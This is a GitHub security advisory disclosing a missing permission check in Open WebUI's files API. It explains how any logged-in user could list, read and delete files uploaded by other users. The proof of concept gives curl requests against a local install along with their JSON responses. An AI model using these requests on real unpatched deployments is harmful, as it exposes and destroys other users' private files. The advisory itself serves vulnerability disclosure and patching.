# [H] Open WebUI: Missing permission check in files API allows authenticated users to list, access and delete every uploaded file

## Summary
Severity: High
Advisory: GHSA-r8wh-8m7r-fh33
CVE: CVE-2026-45301
CWE: CWE-284
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-r8wh-8m7r-fh33
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.3.16

## Details
### Summary
A missing permission check in all files related API endpoints allows any authenticated user to list, access and delete every file uploaded by every user to the platform.

### Details
All `files/` related endpoints lack permission checks.

#### Listing all files
For example, let's see how file listing is implemented:
https://github.com/open-webui/open-webui/blob/e2b7296786053dfc77f6ae0205a1b195e05a712c/backend/apps/webui/routers/files.py#L107-L110
https://github.com/open-webui/open-webui/blob/e2b7296786053dfc77f6ae0205a1b195e05a712c/backend/apps/webui/models/files.py#L26
Notice the endpoint depends only on an authenticated user check, no file filtering is done to match the uploaded files' `user_id` to the requesting user.

This problem repeats itself throughout the various route implementations, allowing any user to perform actions on any file.
Some note worthy functions:
#### Accessing the content of any file
https://github.com/open-webui/open-webui/blob/e2b7296786053dfc77f6ae0205a1b195e05a712c/backend/apps/webui/routers/files.py#L173-L193
#### Deleting any file
https://github.com/open-webui/open-webui/blob/e2b7296786053dfc77f6ae0205a1b195e05a712c/backend/apps/webui/routers/files.py#L224-L241

### PoC
#### Configuration
1. I ran a clean install of the latest version using one of the docker one-liners on an Ubuntu desktop:
`docker run -d -p 3000:8080 -v ollama:/root/.ollama -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:ollama`
2. I created an admin user
3. I created a second user to act as the threat actor with no elevated permissions
4. Admin user uploaded `test.txt` in a conversation with model
5. Admin user uploaded `mydeepest_secret.docx` in a conversation with model

#### Listing files uploaded by other users
1. Login to threat actor
2. Perform a GET request to `/api/v1/files/`
```sh
curl -X 'GET' \
  'http://localhost:3000/api/v1/files/' \
  -H 'accept: application/json'
```
```json
[
  {
    "id": "b9733e9c-0714-4425-8915-d0361bf66dfc",
    "user_id": "c0c16e7a-6f81-4863-8b71-e56e2e389cf1",
    "filename": "b9733e9c-0714-4425-8915-d0361bf66dfc_test.txt",
    "meta": {
      "name": "test.txt",
      "content_type": "text/plain",
      "size": 4,
      "path": "/app/backend/data/uploads/b9733e9c-0714-4425-8915-d0361bf66dfc_test.txt"
    },
    "created_at": 1724709202
  },
  {
    "id": "8f058e18-fec1-4b9f-bb4e-c17f39d03c98",
    "user_id": "c0c16e7a-6f81-4863-8b71-e56e2e389cf1",
    "filename": "8f058e18-fec1-4b9f-bb4e-c17f39d03c98_mydeepest_secret.docx",
    "meta": {
      "name": "mydeepest_secret.docx",
      "content_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
      "size": 6485,
      "path": "/app/backend/data/uploads/8f058e18-fec1-4b9f-bb4e-c17f39d03c98_mydeepest_secret.docx"
    },
    "created_at": 1724710236
  }
]
```

#### Accessing other users' file content
1. Login to threat actor
2. Perform a GET request to `/api/v1/files/{id}/content`
```sh
curl -X 'GET' \
  'http://localhost:3000/api/v1/files/b9733e9c-0714-4425-8915-d0361bf66dfc/content' \
  -H 'accept: application/json'
```
```
wow
```

#### Deleting another user's uploaded file
1. Login to threat actor
2. Perform a DELETE request to `/api/v1/files/{id}`
```sh
curl -X 'DELETE' \
  'http://localhost:3000/api/v1/files/8f058e18-fec1-4b9f-bb4e-c17f39d03c98' \
  -H 'accept: application/json'
```
```json
{
  "message": "File deleted successfully"
}
```
3. We will verify this action by furthur listing all files as mentioned above:
```json
[
  {
    "id": "b9733e9c-0714-4425-8915-d0361bf66dfc",
    "user_id": "c0c16e7a-6f81-4863-8b71-e56e2e389cf1",
    "filename": "b9733e9c-0714-4425-8915-d0361bf66dfc_test.txt",
    "meta": {
      "name": "test.txt",
      "content_type": "text/plain",
      "size": 4,
      "path": "/app/backend/data/uploads/b9733e9c-0714-4425-8915-d0361bf66dfc_test.txt"
    },
    "created_at": 1724709202
  }
]
```

### Impact
Having access to user uploaded files, regardless of ownership or permission level, breaks the confidentiality of sensitive data stored by users. Furthermore, the ability to delete other user's uploaded files disrupts the integrity of the system.

### Personal Notice
In case this submission does get recognized and numbered as a CVE I'd perfer to be credited by my full name - Yuval Gal, instead of my GitHub handle.

Thanks in advance and have a good week (:

## Credits

This vulnerability was reported by **Yuval Gal** (GitHub: @vi11ain).

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-r8wh-8m7r-fh33
- https://nvd.nist.gov/vuln/detail/CVE-2026-45301
- https://github.com/open-webui/open-webui
